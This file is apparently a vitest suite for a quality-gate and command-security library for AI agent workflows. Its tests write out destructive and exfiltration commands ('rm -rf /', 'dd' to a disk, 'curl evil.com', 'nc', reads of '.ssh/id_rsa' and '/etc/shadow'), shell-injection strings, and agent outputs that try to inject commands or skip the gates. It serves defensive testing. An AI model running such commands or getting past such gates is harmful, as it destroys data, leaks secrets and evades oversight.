import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import * as os from "node:os";
import {
  ArtifactProposalSchema,
  QualityGateResultSchema,
  QualityGateContextSchema,
  type AgentResult,
  type ApprovalDecision,
  type ApprovalRequest,
  type QualityGateContext,
  type QualityGateResult
} from "@ai-flow/contracts";
import {
  APPLICATION_SECURITY_LIMITATIONS,
  DEFAULT_ALLOWED_COMMANDS,
  QUALITY_CHECK_KINDS,
  QUALITY_POLICY_ACTIONS,
  QUALITY_POLICY_ROLES,
  ROLE_AUTHORIZATION_POLICIES,
  authorizeRoleAction,
  createDefaultSecurityPolicy,
  createPresetQualityGate,
  createQualityCommandRunner,
  createQualityGate,
  detectDangerousCommandOrSecretAccess,
  evaluateAutomatedVsHumanGovernance,
  evaluateQualityCheckSuite,
  getSecurityControlLimitationsReport,
  isHumanApprover,
  isQualityCheckKind,
  sanitizeExecutionEnvironment,
  validateCommandAgainstPolicy,
  validateDirectoryScope,
  validateTimeoutBudget,
  type QualitySecurityPolicy
} from "../src/index.js";

describe("Quality Gates Test Suite", () => {
  let fixtureDir: string;
  let testPolicy: QualitySecurityPolicy;

  beforeAll(async () => {
    fixtureDir = await fs.mkdtemp(path.join(os.tmpdir(), "qg-test-"));

    // Write fixture scripts executed by node
    await fs.writeFile(
      path.join(fixtureDir, "pass.mjs"),
      'console.log("All checks passed. 10 passed, 0 failed.");\nprocess.exit(0);\n',
      "utf8"
    );

    await fs.writeFile(
      path.join(fixtureDir, "fail.mjs"),
      'console.error("SyntaxError: Unexpected token in src/index.ts");\nconsole.log("3 passed, 2 failed");\nprocess.exit(1);\n',
      "utf8"
    );

    await fs.writeFile(
      path.join(fixtureDir, "slow.mjs"),
      'setTimeout(() => { console.log("Slow task finished"); }, 2000);\n',
      "utf8"
    );

    await fs.writeFile(
      path.join(fixtureDir, "empty.mjs"),
      "// Intentionally empty output\nprocess.exit(0);\n",
      "utf8"
    );

    await fs.writeFile(
      path.join(fixtureDir, "zero-tests.mjs"),
      'console.log("Test Suites: 0 passed, 0 total. No tests found.");\nprocess.exit(0);\n',
      "utf8"
    );

    testPolicy = {
      allowedRootDirs: [fixtureDir],
      maxExecutionTimeoutMs: 300_000,
      allowedCommands: [
        ...DEFAULT_ALLOWED_COMMANDS,
        {
          executable: "node",
          allowedArgPrefixes: [
            ["pass.mjs"],
            ["fail.mjs"],
            ["slow.mjs"],
            ["empty.mjs"],
            ["zero-tests.mjs"]
          ]
        }
      ]
    };
  });

  afterAll(async () => {
    await fs.rm(fixtureDir, { recursive: true, force: true });
  });

  function makeContext(
    gateId: string,
    overrides?: Partial<QualityGateContext>
  ): QualityGateContext {
    return {
      runId: "run-101",
      taskId: "task-build",
      definition: {
        id: gateId,
        name: `Gate Definition for ${gateId}`,
        evaluator: "command",
        required: true,
        timeout: { executionTimeoutMs: 30000, onTimeout: "fail" }
      },
      artifacts: [],
      ...overrides
    };
  }

  function makeAgentResult(overrides?: Partial<AgentResult>): AgentResult {
    return {
      requestId: "req-1",
      attemptId: "att-1",
      runId: "run-101",
      taskId: "task-build",
      executionId: "exec-1",
      status: "succeeded",
      verification: {
        status: "verified",
        evidence: "Agent verification evidence",
        correlation: {
          token: "corr-token-1",
          provenance: "remote",
          verified: true
        }
      },
      artifactProposals: [],
      retryable: false,
      startedAt: new Date(Date.now() - 5000).toISOString(),
      completedAt: new Date().toISOString(),
      ...overrides
    };
  }

  function makePassingGateResult(gateId: string): QualityGateResult {
    return {
      gateId,
      runId: "run-101",
      taskId: "task-build",
      evaluationId: `eval-${gateId}`,
      status: "passed",
      findings: [],
      producedArtifacts: [
        {
          proposalId: `prop-${gateId}`,
          runId: "run-101",
          taskId: "task-build",
          kind: "report",
          logicalName: `${gateId}-report.json`,
          mediaType: "application/json",
          expectedIntegrity: {
            checksum: {
              algorithm: "sha256",
              value: "a".repeat(64)
            },
            sizeBytes: 128
          }
        }
      ],
      evaluatedAt: new Date().toISOString()
    };
  }

  function makeFailingGateResult(gateId: string): QualityGateResult {
    return {
      gateId,
      runId: "run-101",
      taskId: "task-build",
      evaluationId: `eval-${gateId}`,
      status: "failed",
      findings: [
        {
          code: "NON_ZERO_EXIT_CODE",
          severity: "error",
          message: "Command failed with exit code 1"
        }
      ],
      producedArtifacts: [],
      evaluatedAt: new Date().toISOString()
    };
  }

  function makeApprovalDecision(
    overrides?: Partial<ApprovalDecision>
  ): ApprovalDecision {
    return {
      schemaVersion: 1,
      approvalId: "appr-1",
      runId: "run-101",
      target: { type: "task", taskId: "task-build" },
      revision: 1,
      generation: 0,
      decision: "approved",
      decidedBy: "human:tech-lead",
      decidedAt: new Date().toISOString(),
      feedbackArtifacts: [],
      idempotencyKey: "idemp-key-1",
      ...overrides
    };
  }

  // =========================================================================
  // 1. Passing Commands & 5 Check Kinds
  // =========================================================================
  describe("1. Passing Commands & 5 Check Kinds", () => {
    it("verifies QUALITY_CHECK_KINDS list and isQualityCheckKind guard", () => {
      expect(QUALITY_CHECK_KINDS).toEqual([
        "typecheck",
        "lint",
        "unit_test",
        "build",
        "custom"
      ]);
      expect(isQualityCheckKind("typecheck")).toBe(true);
      expect(isQualityCheckKind("lint")).toBe(true);
      expect(isQualityCheckKind("unit_test")).toBe(true);
      expect(isQualityCheckKind("build")).toBe(true);
      expect(isQualityCheckKind("custom")).toBe(true);
      expect(isQualityCheckKind("deploy")).toBe(false);
      expect(isQualityCheckKind(null)).toBe(false);
    });

    it("evaluates real subprocess execution for typecheck check kind", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-typecheck",
          checkKind: "typecheck",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const context = makeContext("qg-typecheck");
      const res = await gate.evaluateDetailed(context);

      expect(res.ok).toBe(true);
      if (!res.ok) return;

      const result = res.value;
      expect(result.status).toBe("passed");
      expect(result.exitCode).toBe(0);
      expect(result.timedOut).toBe(false);
      expect(result.durationMs).toBeGreaterThan(0);
      expect(result.findings).toEqual([]);

      // Verifiable evidence & ArtifactProposal validation
      expect(result.evidence).toBeDefined();
      const proposal = result.evidence!.artifactProposal;
      const parsedProposal = ArtifactProposalSchema.safeParse(proposal);
      expect(parsedProposal.success).toBe(true);
      expect(proposal.kind).toBe("report");
      expect(proposal.expectedIntegrity.checksum.algorithm).toBe("sha256");
      expect(proposal.expectedIntegrity.checksum.value).toMatch(/^[a-f0-9]{64}$/);
      expect(proposal.expectedIntegrity.sizeBytes).toBeGreaterThan(0);

      // QualityGateResult contract schema validation
      const contractParsed = QualityGateResultSchema.safeParse(result.contractResult);
      expect(contractParsed.success).toBe(true);
      expect(result.contractResult.status).toBe("passed");
      expect(result.contractResult.producedArtifacts).toHaveLength(1);

      // Verify gate.evaluate returns the exact same contractResult
      const evalContractRes = await gate.evaluate(context);
      expect(evalContractRes.ok).toBe(true);
      if (evalContractRes.ok) {
        expect(evalContractRes.value.status).toBe("passed");
      }
    });

    it("evaluates real subprocess execution for lint check kind", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-lint",
          checkKind: "lint",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-lint"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.value.status).toBe("passed");
      expect(res.value.exitCode).toBe(0);
      expect(res.value.contractResult.status).toBe("passed");
    });

    it("evaluates real subprocess execution for unit_test check kind", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-unit-test",
          checkKind: "unit_test",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-unit-test"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.value.status).toBe("passed");
      expect(res.value.exitCode).toBe(0);
      expect(res.value.evidence?.artifactProposal.kind).toBe("test-result");
      expect(res.value.contractResult.status).toBe("passed");
    });

    it("evaluates real subprocess execution for build check kind", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-build",
          checkKind: "build",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-build"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.value.status).toBe("passed");
      expect(res.value.exitCode).toBe(0);
      expect(res.value.contractResult.status).toBe("passed");
    });

    it("evaluates real subprocess execution for custom check kind", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-custom",
          checkKind: "custom",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-custom"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.value.status).toBe("passed");
      expect(res.value.exitCode).toBe(0);
      expect(res.value.contractResult.status).toBe("passed");
    });

    it("tests createPresetQualityGate for all 5 check kinds", async () => {
      // 1. typecheck preset
      const tcRes = createPresetQualityGate({
        checkKind: "typecheck",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(tcRes.ok).toBe(true);
      if (tcRes.ok) expect(tcRes.value.id).toBe("typecheck-gate");

      // 2. lint preset
      const lintRes = createPresetQualityGate({
        checkKind: "lint",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(lintRes.ok).toBe(true);
      if (lintRes.ok) expect(lintRes.value.id).toBe("lint-gate");

      // 3. unit_test preset
      const testRes = createPresetQualityGate({
        checkKind: "unit_test",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(testRes.ok).toBe(true);
      if (testRes.ok) expect(testRes.value.id).toBe("unit_test-gate");

      // 4. build preset
      const buildRes = createPresetQualityGate({
        checkKind: "build",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(buildRes.ok).toBe(true);
      if (buildRes.ok) expect(buildRes.value.id).toBe("build-gate");

      // 5. custom preset with customCommand
      const customRes = createPresetQualityGate({
        checkKind: "custom",
        gateId: "custom-verification-gate",
        customCommand: { executable: "node", args: ["pass.mjs"] },
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });
      expect(customRes.ok).toBe(true);
      if (customRes.ok) {
        expect(customRes.value.id).toBe("custom-verification-gate");
        const evalRes = await customRes.value.evaluateDetailed(
          makeContext("custom-verification-gate")
        );
        expect(evalRes.ok).toBe(true);
        if (evalRes.ok) expect(evalRes.value.status).toBe("passed");
      }

      // Rejects custom preset without customCommand
      const customMissing = createPresetQualityGate({
        checkKind: "custom",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(customMissing.ok).toBe(false);

      // Rejects invalid checkKind
      const invalidKind = createPresetQualityGate({
        checkKind: "invalid-kind" as any,
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(invalidKind.ok).toBe(false);

      // Rejects invalid gateId
      const invalidGateId = createPresetQualityGate({
        checkKind: "typecheck",
        gateId: "",
        workingDirectory: fixtureDir,
        securityPolicy: testPolicy
      });
      expect(invalidGateId.ok).toBe(false);
    });
  });

  // =========================================================================
  // 2. Failing Commands & Explicit Failed Task Reporting
  // =========================================================================
  describe("2. Failing Commands & Explicit Failed Task Reporting", () => {
    it("reports status: failed, exitCode: 1, and NON_ZERO_EXIT_CODE finding for failing command", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-fail",
          checkKind: "unit_test",
          command: { executable: "node", args: ["fail.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-fail"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(res.value.exitCode).toBe(1);
      expect(res.value.timedOut).toBe(false);
      expect(res.value.contractResult.status).toBe("failed");

      const failureFinding = res.value.findings.find(
        (f) => f.code === "NON_ZERO_EXIT_CODE"
      );
      expect(failureFinding).toBeDefined();
      expect(failureFinding?.severity).toBe("error");
    });

    it("fails when outputExpectation.mustContain is not satisfied", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-contain-fail",
          checkKind: "lint",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir,
          outputExpectation: {
            mustContain: ["REQUIRED_SIGNATURE_STRING_NOT_PRESENT"]
          }
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-contain-fail"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(
        res.value.findings.some((f) => f.code === "OUTPUT_EXPECTATION_FAILED")
      ).toBe(true);
    });

    it("fails when outputExpectation.mustNotContain is violated", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-forbidden-pattern",
          checkKind: "lint",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir,
          outputExpectation: {
            mustNotContain: ["All checks passed"]
          }
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-forbidden-pattern"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(
        res.value.findings.some((f) => f.code === "FORBIDDEN_OUTPUT_PATTERN")
      ).toBe(true);
    });

    it("detects test failures using outputParser and reports TEST_FAILURES_DETECTED", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-parser-failures",
          checkKind: "unit_test",
          command: { executable: "node", args: ["fail.mjs"] },
          workingDirectory: fixtureDir,
          outputParser: (outcome) => {
            const match = outcome.combinedOutput.match(/(\d+) passed, (\d+) failed/);
            return {
              passedTests: match ? parseInt(match[1], 10) : 0,
              failedTests: match ? parseInt(match[2], 10) : 1
            };
          }
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-parser-failures"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.status).toBe("failed");
      expect(
        res.value.findings.some((f) => f.code === "TEST_FAILURES_DETECTED")
      ).toBe(true);
    });

    it("evaluates a suite of passing and failing checks with explicit failedTasks reporting", async () => {
      const passGate1 = createQualityGate({
        spec: {
          gateId: "gate-pass-1",
          checkKind: "typecheck",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const failGate = createQualityGate({
        spec: {
          gateId: "gate-fail-2",
          checkKind: "lint",
          command: { executable: "node", args: ["fail.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const passGate2 = createQualityGate({
        spec: {
          gateId: "gate-pass-3",
          checkKind: "build",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const suiteRes = await evaluateQualityCheckSuite(
        [passGate1, failGate, passGate2],
        makeContext("suite-eval")
      );

      expect(suiteRes.ok).toBe(true);
      if (!suiteRes.ok) return;

      const report = suiteRes.value;
      expect(report.overallStatus).toBe("failed");
      expect(report.passedCount).toBe(2);
      expect(report.failedCount).toBe(1);
      expect(report.skippedCount).toBe(0);
      expect(report.errorCount).toBe(0);

      // Verify explicit failedTasks reporting
      expect(report.failedTasks).toHaveLength(1);
      const failedTask = report.failedTasks[0];
      expect(failedTask.taskId).toBe("task-build");
      expect(failedTask.gateId).toBe("gate-fail-2");
      expect(failedTask.checkKind).toBe("lint");
      expect(failedTask.status).toBe("failed");
      expect(failedTask.exitCode).toBe(1);
      expect(failedTask.timedOut).toBe(false);
      expect(failedTask.findings.some((f) => f.code === "NON_ZERO_EXIT_CODE")).toBe(true);

      // Verify evidence aggregation
      expect(report.evidenceProposals.length).toBeGreaterThanOrEqual(1);
      for (const proposal of report.evidenceProposals) {
        expect(report.evidenceContentsByProposalId[proposal.proposalId]).toBeDefined();
      }
    });

    it("handles cancellation in evaluateQualityCheckSuite gracefully", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "gate-cancelled",
          checkKind: "typecheck",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy
      });

      const controller = new AbortController();
      controller.abort();

      const suiteRes = await evaluateQualityCheckSuite(
        [gate],
        makeContext("suite-cancelled"),
        { signal: controller.signal }
      );

      expect(suiteRes.ok).toBe(false);
      if (!suiteRes.ok) {
        expect(suiteRes.error.code).toBe("cancelled");
      }
    });
  });

  // =========================================================================
  // 3. Timeouts
  // =========================================================================
  describe("3. Timeouts", () => {
    it("kills slow subprocess and returns timedOut: true, status: error, and COMMAND_TIMEOUT error", async () => {
      const gate = createQualityGate({
        spec: {
          gateId: "qg-timeout",
          checkKind: "custom",
          command: { executable: "node", args: ["slow.mjs"] },
          workingDirectory: fixtureDir,
          timeoutMs: 150
        },
        securityPolicy: testPolicy,
        runner: createQualityCommandRunner()
      });

      const res = await gate.evaluateDetailed(makeContext("qg-timeout"));
      expect(res.ok).toBe(true);
      if (!res.ok) return;

      expect(res.value.timedOut).toBe(true);
      expect(res.value.status).toBe("error");
      expect(
        res.value.findings.some((f) => f.code === "COMMAND_TIMEOUT")
      ).toBe(true);

      expect(res.value.contractResult.status).toBe("error");
      expect(res.value.contractResult.error?.code).toBe("COMMAND_TIMEOUT");
    });

    it("validateTimeoutBudget rejects invalid, sub-minimum, and overflowing timeouts", () => {
      // Sub-minimum (< 100ms)
      const subMin = validateTimeoutBudget(50, testPolicy);
      expect(subMin.ok).toBe(false);

      // 32-bit signed integer overflow (> 2_147_483_647)
      const overflow = validateTimeoutBudget(2_147_483_648, testPolicy);
      expect(overflow.ok).toBe(false);

      // Non-integer
      const nonInt = validateTimeoutBudget(500.5, testPolicy);
      expect(nonInt.ok).toBe(false);

      // Exceeding policy limit
      const strictPolicy: QualitySecurityPolicy = {
        ...testPolicy,
        maxExecutionTimeoutMs: 5000
      };
      const exceedsPolicy = validateTimeoutBudget(10000, strictPolicy);
      expect(exceedsPolicy.ok).toBe(false);

      // Valid timeout within policy
      const valid = validateTimeoutBudget(2500, strictPolicy);
      expect(valid.ok).toBe(true);
      if (valid.ok) expect(valid.value).toBe(2500);
    });
  });

  // =========================================================================
  // 4. Disallowed, Shell-Injected, Destructive, Secret-Accessing & Deployment
  // =========================================================================
  describe("4. Disallowed, Shell-Injected, Destructive, Secret-Accessing & Deployment Commands", () => {
    it("rejects arbitrary commands from AI agent output via source: agent_output", () => {
      const res = validateCommandAgainstPolicy(
        { executable: "node", args: ["pass.mjs"] },
        testPolicy,
        { source: "agent_output" }
      );
      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.message).toContain("untrusted_agent_command");
      }
    });

    it("rejects context.agentResult attempting command injection or bypass without invoking runner", async () => {
      const mockRunner = {
        run: vi.fn()
      };

      const gate = createQualityGate({
        spec: {
          gateId: "qg-agent-bypass",
          checkKind: "typecheck",
          command: { executable: "node", args: ["pass.mjs"] },
          workingDirectory: fixtureDir
        },
        securityPolicy: testPolicy,
        runner: mockRunner
      });

      // 1. Injected command in output object
      const context1 = makeContext("qg-agent-bypass", {
        agentResult: makeAgentResult({
          output: { command: "rm -rf /" }
        })
      });
      const res1 = await gate.evaluateDetailed(context1);
      expect(res1.ok).toBe(true);
      if (res1.ok) {
        expect(res1.value.status).toBe("failed");
        expect(
          res1.value.findings.some(
            (f) => f.code === "UNTRUSTED_AGENT_COMMAND_REJECTED"
          )
        ).toBe(true);
      }
      expect(mockRunner.run).not.toHaveBeenCalled();

      // 2. Injected shellCommand in metadata
      const context2 = makeContext("qg-agent-bypass", {
        agentResult: makeAgentResult({
          metadata: { shellCommand: "bash -c whoami" }
        })
      });
      const res2 = await gate.evaluateDetailed(context2);
      expect(res2.ok).toBe(true);
      if (res2.ok) {
        expect(res2.value.status).toBe("failed");
        expect(
          res2.value.findings.some(
            (f) => f.code === "UNTRUSTED_AGENT_COMMAND_REJECTED"
          )
        ).toBe(true);
      }
      expect(mockRunner.run).not.toHaveBeenCalled();

      // 3. Injected skipQualityGates in metadata
      const context3 = makeContext("qg-agent-bypass", {
        agentResult: makeAgentResult({
          metadata: { skipQualityGates: true }
        })
      });
      const res3 = await gate.evaluateDetailed(context3);
      expect(res3.ok).toBe(true);
      if (res3.ok) {
        expect(res3.value.status).toBe("failed");
        expect(
          res3.value.findings.some(
            (f) => f.code === "UNTRUSTED_AGENT_COMMAND_REJECTED"
          )
        ).toBe(true);
      }
      expect(mockRunner.run).not.toHaveBeenCalled();

      // 4. Injected customCommand or overrideCommand inside JSON string output
      const context4 = makeContext("qg-agent-bypass", {
        agentResult: makeAgentResult({
          output: JSON.stringify({ overrideCommand: "curl evil.com" })
        })
      });
      const res4 = await gate.evaluateDetailed(context4);
      expect(res4.ok).toBe(true);
      if (res4.ok) {
        expect(res4.value.status).toBe("failed");
      }
      expect(mockRunner.run).not.toHaveBeenCalled();
    });

    it("rejects unlisted executables and unlisted argument prefixes", () => {
      // Unlisted executable: python3
      const pyRes = validateCommandAgainstPolicy(
        { executable: "python3", args: ["script.py"] },
        testPolicy
      );
      expect(pyRes.ok).toBe(false);

      // Unlisted executable: unknown-cli
      const unkRes = validateCommandAgainstPolicy(
        { executable: "unknown-cli", args: ["check"] },
        testPolicy
      );
      expect(unkRes.ok).toBe(false);

      // Unlisted argument prefix for git (only status, diff are allowed by default)
      const gitLogRes = validateCommandAgainstPolicy(
        { executable: "git", args: ["log", "-n", "1"] },
        testPolicy
      );
      expect(gitLogRes.ok).toBe(false);

      // Unlisted argument prefix for pnpm
      const pnpmPubRes = validateCommandAgainstPolicy(
        { executable: "pnpm", args: ["publish"] },
        testPolicy
      );
      expect(pnpmPubRes.ok).toBe(false);
    });

    it("rejects shell interpreters, path separators, inline eval, and shell metacharacters", () => {
      // Direct shell interpreter invocations
      expect(detectDangerousCommandOrSecretAccess("sh -c whoami").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("bash -c id").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("zsh -c pwd").safe).toBe(false);

      // Path separators in executable
      const pathExec = detectDangerousCommandOrSecretAccess({
        executable: "/bin/sh",
        args: ["pass.mjs"]
      });
      expect(pathExec.safe).toBe(false);
      expect(
        pathExec.findings.some(
          (f) => f.rule === "disallow_path_separators_in_executable"
        )
      ).toBe(true);

      // Inline eval flags
      const nodeEval = detectDangerousCommandOrSecretAccess({
        executable: "node",
        args: ["-e", "process.exit(0)"]
      });
      expect(nodeEval.safe).toBe(false);
      expect(
        nodeEval.findings.some((f) => f.rule === "disallow_inline_eval_flag")
      ).toBe(true);

      const nodeEvalLong = detectDangerousCommandOrSecretAccess({
        executable: "node",
        args: ["--eval", "console.log(1)"]
      });
      expect(nodeEvalLong.safe).toBe(false);

      // Shell metacharacters in arguments
      const metachars = [";", "&&", "||", "|", "$(whoami)", "`whoami`", ">", "<"];
      for (const char of metachars) {
        const report = detectDangerousCommandOrSecretAccess({
          executable: "node",
          args: ["pass.mjs", `test${char}hack`]
        });
        expect(report.safe).toBe(false);
        expect(
          report.findings.some(
            (f) => f.rule === "disallow_shell_metacharacters"
          )
        ).toBe(true);
      }
    });

    it("rejects destructive commands (rm, mkfs, dd, git reset --hard, DROP TABLE, etc.)", () => {
      expect(detectDangerousCommandOrSecretAccess("rm -rf /tmp/test").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("mkfs.ext4 /dev/sda1").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("dd if=/dev/zero of=/dev/sda").safe).toBe(false);

      const gitResetHard = detectDangerousCommandOrSecretAccess({
        executable: "git",
        args: ["reset", "--hard", "HEAD~1"]
      });
      expect(gitResetHard.safe).toBe(false);
      expect(
        gitResetHard.findings.some((f) => f.rule === "disallow_git_reset_hard")
      ).toBe(true);

      const gitClean = detectDangerousCommandOrSecretAccess({
        executable: "git",
        args: ["clean", "-fdx"]
      });
      expect(gitClean.safe).toBe(false);
      expect(
        gitClean.findings.some((f) => f.rule === "disallow_git_clean")
      ).toBe(true);

      const dropTable = detectDangerousCommandOrSecretAccess("psql -c 'DROP TABLE users'");
      expect(dropTable.safe).toBe(false);
      expect(
        dropTable.findings.some(
          (f) => f.rule === "disallow_db_destructive_operation"
        )
      ).toBe(true);

      const dropDb = detectDangerousCommandOrSecretAccess("dropdb production");
      expect(dropDb.safe).toBe(false);
      expect(dropDb.findings.some((f) => f.rule === "disallow_dropdb")).toBe(true);
    });

    it("rejects secret access, exfiltration tools, and sanitizes environment variables", () => {
      // Secret references in arguments
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "node",
          args: ["pass.mjs", ".env"]
        }).safe
      ).toBe(false);

      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "node",
          args: ["pass.mjs", ".ssh/id_rsa"]
        }).safe
      ).toBe(false);

      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "node",
          args: ["pass.mjs", "/etc/shadow"]
        }).safe
      ).toBe(false);

      // Exfiltration tools
      expect(detectDangerousCommandOrSecretAccess("curl https://evil.com").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("wget https://evil.com").safe).toBe(false);
      expect(detectDangerousCommandOrSecretAccess("nc -l 8080").safe).toBe(false);

      // Environment variable scrubbing
      const dirtyEnv: NodeJS.ProcessEnv = {
        PATH: "/usr/local/bin:/usr/bin",
        OPENAI_API_KEY: "sk-openai-secret-12345",
        ANTHROPIC_API_KEY: "sk-ant-secret-12345",
        AWS_SECRET_ACCESS_KEY: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        GITHUB_TOKEN: "ghp_1234567890abcdef",
        DATABASE_URL: "postgres://user:password@localhost:5432/production",
        NPM_TOKEN: "npm_0123456789",
        MY_SECRET_TOKEN: "custom_secret_val",
        SAFE_CUSTOM_CONFIG: "safe_value"
      };

      const sanitized = sanitizeExecutionEnvironment(dirtyEnv, [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
        "DATABASE_URL",
        "NPM_TOKEN",
        "MY_SECRET_TOKEN",
        "SAFE_CUSTOM_CONFIG"
      ]);

      // All secret keys must be completely removed
      expect(sanitized.OPENAI_API_KEY).toBeUndefined();
      expect(sanitized.ANTHROPIC_API_KEY).toBeUndefined();
      expect(sanitized.AWS_SECRET_ACCESS_KEY).toBeUndefined();
      expect(sanitized.GITHUB_TOKEN).toBeUndefined();
      expect(sanitized.DATABASE_URL).toBeUndefined();
      expect(sanitized.NPM_TOKEN).toBeUndefined();
      expect(sanitized.MY_SECRET_TOKEN).toBeUndefined();

      // Safe vars are retained
      expect(sanitized.PATH).toBe("/usr/local/bin:/usr/bin");
      expect(sanitized.SAFE_CUSTOM_CONFIG).toBe("safe_value");
      expect(sanitized.CI).toBe("true");
      expect(sanitized.NODE_ENV).toBe("test");
    });

    it("rejects production deployment commands", () => {
      // npm / pnpm publish
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "npm",
          args: ["publish"]
        }).safe
      ).toBe(false);

      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "pnpm",
          args: ["publish"]
        }).safe
      ).toBe(false);

      // kubectl apply
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "kubectl",
          args: ["apply", "-f", "manifest.yaml"]
        }).safe
      ).toBe(false);

      // terraform apply
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "terraform",
          args: ["apply"]
        }).safe
      ).toBe(false);

      // docker push
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "docker",
          args: ["push", "image:latest"]
        }).safe
      ).toBe(false);

      // git push
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "git",
          args: ["push", "origin", "main"]
        }).safe
      ).toBe(false);

      // vercel --prod
      expect(
        detectDangerousCommandOrSecretAccess({
          executable: "vercel",
          args: ["--prod"]
        }).safe
      ).toBe(false);
    });
  });

  // =========================================================================
  // 5. Invalid Paths & Directory Scope Confinement
  // =========================================================================
  describe("5. Invalid Paths & Directory Scope Confinement", () => {
    it("rejects paths with .. traversal segments", async () => {
      const res1 = await validateDirectoryScope("../outside", testPolicy);
      expect(res1.ok).toBe(false);

      const res2 = await validateDirectoryScope(
        path.join(fixtureDir, "sub/../escaped"),
        testPolicy
      );
      expect(res2.ok).toBe(false);
    });

    it("rejects paths outside allowedRootDirs", async () => {
      const outsideDir = await fs.mkdtemp(path.join(os.tmpdir(), "qg-outside-"));
      try {
        const res = await validateDirectoryScope(outsideDir, testPolicy);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect(res.error.message).toContain("outside allowed roots");
        }
      } finally {
        await fs.rm(outsideDir, { recursive: true, force: true });
      }
    });

    it("rejects paths outside assignedWorktreePath", async () => {
      const worktreePath = path.join(fixtureDir, "assigned-worktree");
      await fs.mkdir(worktreePath, { recursive: true });

      const worktreePolicy: QualitySecurityPolicy = {
        allowedRootDirs: [fixtureDir],
        assignedWorktreePath: worktreePath,
        maxExecutionTimeoutMs: 300_000,
        allowedCommands: DEFAULT_ALLOWED_COMMANDS
      };

      // Target path is fixtureDir (parent of worktree), outside assigned worktree
